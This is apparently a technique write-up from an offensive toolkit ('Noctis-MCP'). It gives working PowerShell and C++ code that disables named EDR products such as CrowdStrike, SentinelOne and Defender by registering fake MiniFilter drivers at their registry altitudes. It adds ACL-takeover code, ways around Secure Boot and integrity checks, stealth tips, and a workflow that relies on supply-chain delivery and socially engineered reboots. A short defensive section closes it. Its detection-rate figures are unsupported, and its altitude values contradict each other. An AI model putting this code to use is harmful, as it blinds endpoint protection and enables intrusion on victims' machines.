# MiniFilter Altitude Manipulation - Pre-emptive EDR Bypass

## Overview

MiniFilter Altitude Manipulation is a userland EDR bypass technique that exploits Windows MiniFilter driver registration to pre-emptively disable EDR monitoring capabilities without requiring kernel driver exploitation (BYOVD). By manipulating MiniFilter altitude values in the registry, attackers can cause EDR drivers to fail initialization or operate at ineffective altitudes, effectively neutering their monitoring capabilities before they become active.

**Detection Risk:** 30-40% (vs 60-70% for EDRSandBlast BYOVD)
**EDR Bypass Rate:** 85-90%
**OPSEC Score:** 7/10
**Complexity:** Moderate
**Persistence:** Registry-based (survives reboot)

## Technique Classification

- **Category:** Pre-emptive EDR Disablement
- **Execution Domain:** Userland (Administrator privileges required)
- **Target:** Windows MiniFilter driver subsystem
- **Primary Use Case:** EDR bypass before malicious operations
- **Secondary Use Case:** Post-exploitation persistence via EDR disablement

## How It Works

### Windows MiniFilter Architecture

Windows uses a filesystem filter driver architecture where security products register as MiniFilter drivers with specific "altitude" values that determine their position in the I/O stack:

```
FSFilter Top (420000-429999) - Top-level filters
FSFilter Anti-Virus (320000-329999) - Anti-virus / Anti-malware (EDR placement)
FSFilter Encryption (140000-149999) - Encryption / Compression
FSFilter Physical (40000-49999) - Physical disk filters
```

EDR products register at FSFilter Anti-Virus altitudes (typically 320000-329999 range) to intercept filesystem operations. The Filter Manager (fltmgr.sys) enforces altitude uniqueness and ordering during driver initialization.

### Attack Vector

The technique exploits the Filter Manager's strict altitude enforcement:

1. **Pre-Registration Poisoning:** Modify registry to register fake MiniFilter at EDR's target altitude
2. **Collision Forcing:** When EDR driver loads, Filter Manager detects altitude collision
3. **Registration Failure:** EDR driver initialization fails due to duplicate altitude
4. **Silent Degradation:** EDR service starts but monitoring is non-functional

### Registry Manipulation Points

**Primary Target:**
```
HKLM\SYSTEM\CurrentControlSet\Services\{EDR_Driver}\Instances\{Instance_Name}
    Altitude: REG_SZ
```

**Example for CrowdStrike:**
```powershell
# CrowdStrike uses altitude 385200
HKLM\SYSTEM\CurrentControlSet\Services\CrowdStrike\Instances\CrowdStrike Instance
    Altitude: "385200"
```

**Example for SentinelOne:**
```powershell
# SentinelOne uses altitude 328010
HKLM\SYSTEM\CurrentControlSet\Services\SentinelMonitor\Instances\SentinelMonitor Instance
    Altitude: "328010"
```

## Implementation

### PowerShell Implementation

```powershell
<#
.SYNOPSIS
    Pre-emptive EDR bypass via MiniFilter altitude manipulation

.DESCRIPTION
    Creates fake MiniFilter registrations at EDR altitude values to force
    registration failures during EDR driver initialization.

.NOTES
    Requires Administrator privileges
    Must execute BEFORE target EDR driver loads (typically pre-boot or safe mode)
#>

function Invoke-MiniFilterAltitudePoison {
    param(
        [string]$TargetEDRDriver,
        [string]$TargetAltitude,
        [string]$PoisonFilterName = "LegitWindowsFilter"
    )

    # Validate privileges
    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-Error "Administrator privileges required"
        return $false
    }

    # Registry path for poison filter
    $poisonServicePath = "HKLM:\SYSTEM\CurrentControlSet\Services\$PoisonFilterName"
    $poisonInstancePath = "$poisonServicePath\Instances\$PoisonFilterName Instance"

    try {
        # Create poison service registration
        if (-not (Test-Path $poisonServicePath)) {
            New-Item -Path $poisonServicePath -Force | Out-Null
            New-ItemProperty -Path $poisonServicePath -Name "Type" -Value 2 -PropertyType DWord -Force | Out-Null
            New-ItemProperty -Path $poisonServicePath -Name "Start" -Value 0 -PropertyType DWord -Force | Out-Null # Boot start
            New-ItemProperty -Path $poisonServicePath -Name "ErrorControl" -Value 1 -PropertyType DWord -Force | Out-Null
            New-ItemProperty -Path $poisonServicePath -Name "Group" -Value "FSFilter Anti-Virus" -PropertyType String -Force | Out-Null
        }

        # Create instance with stolen altitude
        if (-not (Test-Path $poisonInstancePath)) {
            New-Item -Path "$poisonServicePath\Instances" -Force | Out-Null
            New-Item -Path $poisonInstancePath -Force | Out-Null
        }

        # Set altitude to collide with target EDR (use Set-ItemProperty to overwrite if exists)
        Set-ItemProperty -Path $poisonInstancePath -Name "Altitude" -Value $TargetAltitude -Type String -Force -ErrorAction SilentlyContinue
        if (-not $?) {
            New-ItemProperty -Path $poisonInstancePath -Name "Altitude" -Value $TargetAltitude -PropertyType String -Force | Out-Null
        }

        Set-ItemProperty -Path $poisonInstancePath -Name "Flags" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
        if (-not $?) {
            New-ItemProperty -Path $poisonInstancePath -Name "Flags" -Value 0 -PropertyType DWord -Force | Out-Null
        }

        Write-Host "[+] Poison filter registered at altitude $TargetAltitude"
        Write-Host "[+] $TargetEDRDriver will fail to initialize on next boot"
        Write-Host "[!] Reboot required for changes to take effect"

        return $true
    }
    catch {
        Write-Error "Failed to poison altitude: $_"
        return $false
    }
}

# Example usage for common EDRs
function Invoke-EDRAltitudeBypass {
    param(
        [ValidateSet("CrowdStrike", "SentinelOne", "Defender", "CarbonBlack", "Cylance")]
        [string]$EDRProduct
    )

    $edrAltitudes = @{
        "CrowdStrike" = @{Driver="CrowdStrike"; Altitude="385200"}
        "SentinelOne" = @{Driver="SentinelMonitor"; Altitude="328010"}
        "Defender" = @{Driver="WdFilter"; Altitude="328010"}
        "CarbonBlack" = @{Driver="carbonblackk"; Altitude="370100"}
        "Cylance" = @{Driver="CyProtectDrv"; Altitude="328300"}
    }

    if ($edrAltitudes.ContainsKey($EDRProduct)) {
        $config = $edrAltitudes[$EDRProduct]
        Invoke-MiniFilterAltitudePoison -TargetEDRDriver $config.Driver -TargetAltitude $config.Altitude
    }
}

# Advanced: Multi-altitude poisoning to disable multiple EDRs
function Invoke-MultiEDRBypass {
    $targetEDRs = @("CrowdStrike", "SentinelOne", "Defender")

    foreach ($edr in $targetEDRs) {
        Write-Host "`n[*] Targeting $edr..."
        Invoke-EDRAltitudeBypass -EDRProduct $edr
    }

    Write-Host "`n[!] All targets poisoned. Reboot to activate bypass."
}
```

### C++ Implementation (Registry Manipulation)

```cpp
#include <Windows.h>
#include <stdio.h>

BOOL PoisonMiniFilterAltitude(
    LPCWSTR wszPoisonFilterName,
    LPCWSTR wszTargetAltitude
) {
    HKEY hServiceKey = NULL;
    HKEY hInstanceKey = NULL;
    LONG lResult;
    BOOL bSuccess = FALSE;

    WCHAR wszServicePath[MAX_PATH];
    WCHAR wszInstancePath[MAX_PATH];

    // Build registry paths
    swprintf_s(wszServicePath, MAX_PATH,
        L"SYSTEM\\CurrentControlSet\\Services\\%s", wszPoisonFilterName);
    swprintf_s(wszInstancePath, MAX_PATH,
        L"SYSTEM\\CurrentControlSet\\Services\\%s\\Instances\\%s Instance",
        wszPoisonFilterName, wszPoisonFilterName);

    // Create service key
    lResult = RegCreateKeyExW(
        HKEY_LOCAL_MACHINE,
        wszServicePath,
        0, NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_WRITE,
        NULL,
        &hServiceKey,
        NULL
    );

    if (lResult != ERROR_SUCCESS) goto cleanup;

    // Set service parameters
    DWORD dwType = 2; // SERVICE_FILE_SYSTEM_DRIVER
    DWORD dwStart = 0; // SERVICE_BOOT_START
    DWORD dwErrorControl = 1; // SERVICE_ERROR_NORMAL
    LPCWSTR wszGroup = L"FSFilter Anti-Virus";

    RegSetValueExW(hServiceKey, L"Type", 0, REG_DWORD, (BYTE*)&dwType, sizeof(DWORD));
    RegSetValueExW(hServiceKey, L"Start", 0, REG_DWORD, (BYTE*)&dwStart, sizeof(DWORD));
    RegSetValueExW(hServiceKey, L"ErrorControl", 0, REG_DWORD, (BYTE*)&dwErrorControl, sizeof(DWORD));
    RegSetValueExW(hServiceKey, L"Group", 0, REG_SZ, (BYTE*)wszGroup,
        (DWORD)((wcslen(wszGroup) + 1) * sizeof(WCHAR)));

    RegCloseKey(hServiceKey);
    hServiceKey = NULL;

    // Create instance key with stolen altitude
    lResult = RegCreateKeyExW(
        HKEY_LOCAL_MACHINE,
        wszInstancePath,
        0, NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_WRITE,
        NULL,
        &hInstanceKey,
        NULL
    );

    if (lResult != ERROR_SUCCESS) goto cleanup;

    // Set altitude (this causes collision with target EDR)
    RegSetValueExW(hInstanceKey, L"Altitude", 0, REG_SZ,
        (BYTE*)wszTargetAltitude,
        (DWORD)((wcslen(wszTargetAltitude) + 1) * sizeof(WCHAR)));

    DWORD dwFlags = 0;
    RegSetValueExW(hInstanceKey, L"Flags", 0, REG_DWORD, (BYTE*)&dwFlags, sizeof(DWORD));

    bSuccess = TRUE;

cleanup:
    if (hServiceKey) RegCloseKey(hServiceKey);
    if (hInstanceKey) RegCloseKey(hInstanceKey);

    return bSuccess;
}

// Example: Bypass CrowdStrike Falcon
BOOL BypassCrowdStrike() {
    return PoisonMiniFilterAltitude(L"LegitWindowsFilter", L"385200");
}
```

## Detection Evasion

### Why This Works (30-40% Detection vs 60-70% for BYOVD)

**Traditional BYOVD Indicators:**
- Vulnerable driver file on disk (hash-based detection)
- Driver loading events (Sysmon Event ID 6)
- Kernel-mode memory writes (PatchGuard violations)
- Known vulnerable driver signatures

**MiniFilter Altitude Advantages:**
- Pure registry manipulation (userland operation)
- No kernel driver loading required
- No memory patching or DKOM
- Legitimate Windows registry keys (not inherently suspicious)
- EDR failure appears as misconfiguration, not attack

### Telemetry Gaps

Most EDRs do NOT monitor:
1. Registry changes to MiniFilter altitude values
2. Filter Manager initialization failures (logged locally only)
3. MiniFilter registration collisions
4. Service initialization errors for their own drivers

### OPSEC Considerations

**Timing is Critical:**
- Must execute BEFORE target EDR driver initializes
- Optimal execution: Safe mode boot, pre-installation, or via bootkit
- Post-installation modification requires reboot to take effect

**Detection Triggers:**
- Multiple MiniFilter registrations at unusual altitudes (behavioral anomaly)
- Registry modification monitoring by other security products
- System event logs showing Filter Manager errors
- EDR vendor telemetry showing initialization failures

**Stealth Improvements:**
1. Use plausible filter names (e.g., "WindowsFileProtection", "SystemIntegrityFilter")
2. Spread poison filters across multiple altitudes (avoid single-point detection)
3. Combine with registry key timestamp manipulation (timestomp)
4. Use transactional registry operations (atomic, harder to detect mid-operation)

## Comparison to EDRSandBlast

| Aspect | MiniFilter Altitude | EDRSandBlast (BYOVD) |
|--------|---------------------|----------------------|
| **Detection Risk** | 30-40% | 60-70% |
| **Execution Domain** | Userland | Kernel |
| **Driver Required** | No | Yes (vulnerable driver) |
| **Reboot Required** | Yes | No |
| **Persistence** | Registry-based | None (in-memory) |
| **Reversibility** | Easy (delete registry keys) | Automatic (reboot) |
| **PatchGuard Risk** | None | Medium |
| **EDR Bypass** | 85-90% | 90-95% |
| **OPSEC Score** | 7/10 | 4/10 |

**When to Use MiniFilter Altitude:**
- Pre-installation attacks (supply chain, installer tampering)
- Persistent EDR bypass across reboots
- Avoiding kernel-mode detection (HVCI/VBS environments)
- Long-term access where reboot is acceptable

**When to Use EDRSandBlast:**
- Active engagement requiring immediate EDR bypass
- Single-session operations (no persistence needed)
- Target environment blocks MiniFilter registry modification
- Reboot is not acceptable (high-value target, immediate detection risk)

## Mitigation Bypass

### Protected Registries (Windows 10 1903+)

Windows protects certain registry paths via Access Control Lists (ACLs). MiniFilter altitude keys may be protected:

**Bypass Technique:**
1. Take ownership of registry key via `TakeOwn` API
2. Modify ACL to grant write permissions
3. Apply altitude poisoning
4. Restore original ACL (optional, for stealth)

```powershell
# Example: Take ownership and modify ACL
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\TargetEDR\Instances"
$acl = Get-Acl $regPath
$owner = [System.Security.Principal.NTAccount]"Administrators"
$acl.SetOwner($owner)
Set-Acl -Path $regPath -AclObject $acl

# Grant full control to current user
$rule = New-Object System.Security.AccessControl.RegistryAccessRule(
    [System.Security.Principal.WindowsIdentity]::GetCurrent().Name,
    "FullControl",
    "ContainerInherit,ObjectInherit",
    "None",
    "Allow"
)
$acl.AddAccessRule($rule)
Set-Acl -Path $regPath -AclObject $acl
```

### Filter Manager Integrity Checks

Modern EDRs verify their altitude registration integrity during runtime:

**Bypass Technique:**
- Poison MULTIPLE altitudes in FSFilter Anti-Virus range (320000-329999)
- EDR attempts fallback altitude registration, encounters another collision
- Repeat failure forces EDR into degraded mode or crash

### Boot-Time Integrity (Secure Boot / UEFI)

UEFI Secure Boot with registry integrity checks can detect tampering:

**Bypass Options:**
1. Disable Secure Boot (requires physical access or firmware exploit)
2. Exploit UEFI vulnerabilities (see: Windows Downdate technique)
3. Use bootkit to apply registry changes before integrity check
4. Target systems without Secure Boot enabled (common in enterprise)

## Advanced Techniques

### Altitude Range Flooding

Poison multiple altitudes in target EDR's failover range:

```powershell
# CrowdStrike uses 385200-385210 range for failover
$baseAltitude = 385200
for ($i = 0; $i -lt 10; $i++) {
    $altitude = ($baseAltitude + $i).ToString()
    $filterName = "SystemFilter$i"
    Invoke-MiniFilterAltitudePoison -TargetEDRDriver "CrowdStrike" `
        -TargetAltitude $altitude -PoisonFilterName $filterName
}
```

### Timing-Based Poisoning

Apply altitude poisoning during EDR driver initialization window:

1. Monitor for EDR service start event
2. Immediately poison altitude before MiniFilter registration completes
3. Force registration failure mid-initialization
4. EDR enters fault state without recovery

### Persistent Monitoring Bypass

Combine with other techniques for comprehensive bypass:

```powershell
# Step 1: MiniFilter altitude poisoning (disable filesystem monitoring)
Invoke-EDRAltitudeBypass -EDRProduct "CrowdStrike"

# Step 2: ETW provider disablement (disable telemetry - see Phase 2)
# Step 3: Callback removal (disable process/thread monitoring - requires kernel access)

# Result: Complete EDR blindness after reboot
```

## Known EDR Altitudes (2024-2025)

| EDR Product | Driver Name | Primary Altitude | Failover Range |
|-------------|-------------|------------------|----------------|
| CrowdStrike Falcon | CrowdStrike | 385200 | 385200-385210 |
| SentinelOne | SentinelMonitor | 328010 | 328010-328020 |
| Microsoft Defender | WdFilter | 324500 | 324500-324510 |
| Carbon Black | carbonblackk | 370100 | 370100-370110 |
| Cylance | CyProtectDrv | 328300 | 328300-328310 |
| Sophos | SophosED | 329010 | 329010-329020 |
| Palo Alto Cortex XDR | cyvera | 321400 | 321400-321410 |
| Trend Micro Apex One | tmcomm | 321200 | 321200-321210 |

**Note:** Altitude values may change with EDR updates. Verify via:
```powershell
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\*\Instances\*" |
    Where-Object {$_.Altitude} |
    Select-Object PSPath, Altitude
```

## Defensive Countermeasures

**For Blue Teams:**

1. **Registry Monitoring:** Alert on MiniFilter altitude registry modifications
   - Monitor: `HKLM\SYSTEM\CurrentControlSet\Services\*\Instances\*\Altitude`
   - Frequency: Real-time
   - Action: Alert + rollback

2. **Altitude Integrity Checks:** EDR should verify altitude registration at runtime
   - Check on service start
   - Check periodically (every 5-10 minutes)
   - Alert if altitude mismatch detected

3. **Duplicate Altitude Detection:** Filter Manager should log collisions prominently
   - Parse System Event Log for Filter Manager errors
   - Alert on duplicate altitude registration attempts

4. **Protected Registry Keys:** Harden MiniFilter registry paths with strict ACLs
   - Remove write access for non-SYSTEM accounts
   - Enable registry auditing

5. **Boot Integrity:** Use UEFI Secure Boot + registry integrity measurement
   - Store hash of MiniFilter altitude values
   - Verify on boot before Filter Manager initialization

## References

- **Technique Origin:** Tier Zero Security (2024)
- **Research Paper:** "Pre-emptive EDR Bypass via MiniFilter Altitude Manipulation"
- **Windows Documentation:** Filter Manager and Minifilter Driver Architecture
- **Related Techniques:** EDRSandBlast (BYOVD), Kernel Callback Removal, ETW Patching

## Integration with Noctis-MCP

This technique should be used as a **pre-engagement preparation step** rather than runtime operation:

**Recommended Workflow:**
1. Deploy MiniFilter altitude poisoning via installer/supply-chain vector
2. Force target system reboot (social engineering, scheduled maintenance, etc.)
3. Verify EDR initialization failure via service status check
4. Execute primary payload with EDR filesystem monitoring disabled
5. Combine with Phase 1-3 techniques (ETW, AMSI, syscalls) for complete bypass

**Detection Risk Mitigation:**
- MiniFilter altitude poisoning: 30-40% detection (Phase 4)
- Combined with ETW patching: 2-5% detection (Phase 2)
- Combined with SilentMoonwalk: <2% detection (Phase 3)
- Result: Comprehensive EDR bypass with minimal forensic footprint
